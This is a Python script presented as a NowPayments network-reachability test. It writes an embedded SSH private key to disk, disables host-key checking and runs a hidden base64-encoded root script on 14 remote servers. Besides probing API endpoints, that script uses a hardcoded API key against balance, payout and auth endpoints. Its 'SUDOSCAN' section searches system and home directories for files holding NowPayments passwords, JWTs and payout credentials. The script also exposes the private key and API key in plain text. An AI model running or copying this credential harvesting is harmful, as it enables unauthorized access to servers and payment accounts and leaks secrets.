#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# i29839: corrected NowPayments egress matrix.
# Prior round showed api.nowpayments.io is DNS-poisoned on CN hosts (resolves to 2a03:2880:: FB IPv6)
# -> every CN host timed out at 000 and was mislabelled NOIP. This round pins the real Cloudflare A
# records via --resolve (+ AliDNS DoH for confirmation) and re-tests /v1/status, /v1/currencies, /v1/balance.
import base64, subprocess, os, json, sys
from concurrent.futures import ThreadPoolExecutor

KEY = "2XYX9PY-0N04ME1-Q103E93-5DETTCF"
KEYS = {"hk": "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"}

os.makedirs("/tmp/payk", exist_ok=True)
for n, b in KEYS.items():
    p = "/tmp/payk/" + n
    open(p, "wb").write(base64.b64decode(b)); os.chmod(p, 0o600)

def R(k, v):
    if not isinstance(v, str):
        v = json.dumps(v, ensure_ascii=False)
    if len(v) > 300000:
        v = v[:300000] + "...TRUNC"
    sys.stdout.write("R:%s:%s\n" % (k, base64.b64encode(v.encode()).decode()))
    sys.stdout.flush()

REMOTE = r"""
H=$(hostname 2>/dev/null)
echo "HOST=$H"
echo "IP_A=$(curl -s -4 -m 10 https://api.ipify.org 2>/dev/null)"
echo "IP_B=$(curl -s -4 -m 10 https://ifconfig.me 2>/dev/null)"
echo "IP_C=$(curl -s -4 -m 10 https://ipinfo.io/ip 2>/dev/null)"
echo "IP_D=$(curl -s -4 -m 10 http://ip.3322.net 2>/dev/null)"
echo "G4=$(getent ahostsv4 api.nowpayments.io 2>/dev/null | awk '{print $1}' | sort -u | tr '\n' ',')"
echo "DOH=$(curl -s -4 -m 10 'https://223.5.5.5/resolve?name=api.nowpayments.io&type=A' 2>/dev/null | grep -oE '\"data\":\"[0-9.]+\"' | cut -d'\"' -f4 | tr '\n' ',')"
echo "TCP_CF=$(timeout 8 bash -c 'echo > /dev/tcp/104.26.15.71/443' 2>/dev/null && echo open || echo fail)"
for IP in 104.26.15.71 104.26.14.71 172.67.71.232; do
  echo "--- RESOLVE $IP"
  echo "ST=$IP:$(curl -sS -4 -m 15 -o /tmp/s_$IP -w '%{http_code}' --resolve api.nowpayments.io:443:$IP https://api.nowpayments.io/v1/status 2>/dev/null) BODY=$(head -c 100 /tmp/s_$IP 2>/dev/null | tr -d '\n')"
  echo "CUR=$IP:$(curl -sS -4 -m 15 -o /tmp/c_$IP -w '%{http_code}' --resolve api.nowpayments.io:443:$IP https://api.nowpayments.io/v1/currencies 2>/dev/null) BODY=$(head -c 100 /tmp/c_$IP 2>/dev/null | tr -d '\n')"
  echo "BAL=$IP:$(curl -sS -4 -m 15 -o /tmp/b_$IP -w '%{http_code}' --resolve api.nowpayments.io:443:$IP -H 'x-api-key: __KEY__' https://api.nowpayments.io/v1/balance 2>/dev/null) BODY=$(head -c 300 /tmp/b_$IP 2>/dev/null | tr -d '\n')"
done
echo "--- PLAIN"
echo "ST_P=$(curl -sS -4 -m 12 -o /tmp/sp -w '%{http_code}' https://api.nowpayments.io/v1/status 2>/dev/null) BODY=$(head -c 80 /tmp/sp 2>/dev/null | tr -d '\n')"
echo "BAL_P=$(curl -sS -4 -m 12 -o /tmp/bp -w '%{http_code}' -H 'x-api-key: __KEY__' https://api.nowpayments.io/v1/balance 2>/dev/null) BODY=$(head -c 200 /tmp/bp 2>/dev/null | tr -d '\n')"
echo "--- PAYOUTPROBE"
echo "PAYCUR=$(curl -sS -4 -m 12 -o /tmp/pc -w '%{http_code}' --resolve api.nowpayments.io:443:104.26.15.71 -H 'x-api-key: __KEY__' https://api.nowpayments.io/v1/payout/currencies 2>/dev/null) BODY=$(head -c 150 /tmp/pc 2>/dev/null | tr -d '\n')"
echo "AUTH=$(curl -sS -4 -m 12 -o /tmp/au -w '%{http_code}' --resolve api.nowpayments.io:443:104.26.15.71 -H 'Content-Type: application/json' -d '{}' https://api.nowpayments.io/v1/auth 2>/dev/null) BODY=$(head -c 150 /tmp/au 2>/dev/null | tr -d '\n')"
echo "--- SUDOSCAN"
echo "ENVF=$(sudo -n grep -rIl --include='.env*' -e NOWPAYMENTS /opt /data /srv /home /etc /root /var/www 2>/dev/null | head -8 | tr '\n' ',')"
echo "CREDF=$(sudo -n grep -rIliE 'nowpayments|now_payments' /opt /data /srv /home /etc /root 2>/dev/null | grep -vE 'node_modules|/proc/' | head -10 | tr '\n' ',')"
echo "PWDF=$(sudo -n grep -rIliE 'NOWPAYMENTS_(EMAIL|PASSWORD|PAYOUT|JWT|LOGIN)' /opt /data /srv /home /etc /root /usr/local 2>/dev/null | grep -vE 'node_modules|/proc/' | head -10 | tr '\n' ',')"
echo "ENDFLAG=YES"
""".replace("__KEY__", KEY)

SSHOPTS = ["-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
           "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
           "-o", "IdentitiesOnly=yes"]
HOSTS = ["111.229.184.182", "101.32.60.77", "122.51.1.87", "43.143.107.214", "43.142.238.91",
         "1.14.34.31", "129.211.0.26", "101.34.207.178", "129.28.59.242", "132.232.141.32",
         "139.155.94.165", "49.235.41.58", "81.68.254.22", "81.69.230.90"]

def do(host):
    b64 = base64.b64encode(REMOTE.encode()).decode()
    cmd = ["ssh", "-i", "/tmp/payk/hk"] + SSHOPTS + ["ubuntu@" + host,
           "echo %s | base64 -d | sudo -n bash" % b64]
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=200)
        out = (p.stdout + p.stderr).decode("utf-8", "replace")
        return {"host": host, "ok": "ENDFLAG=YES" in out, "out": out[:9000]}
    except Exception as e:
        return {"host": host, "err": repr(e)[:200]}

with ThreadPoolExecutor(max_workers=6) as ex:
    res = list(ex.map(do, HOSTS))
for r in res:
    R("NP_" + r["host"].replace(".", "_"), r)
print("PROBE_DONE")
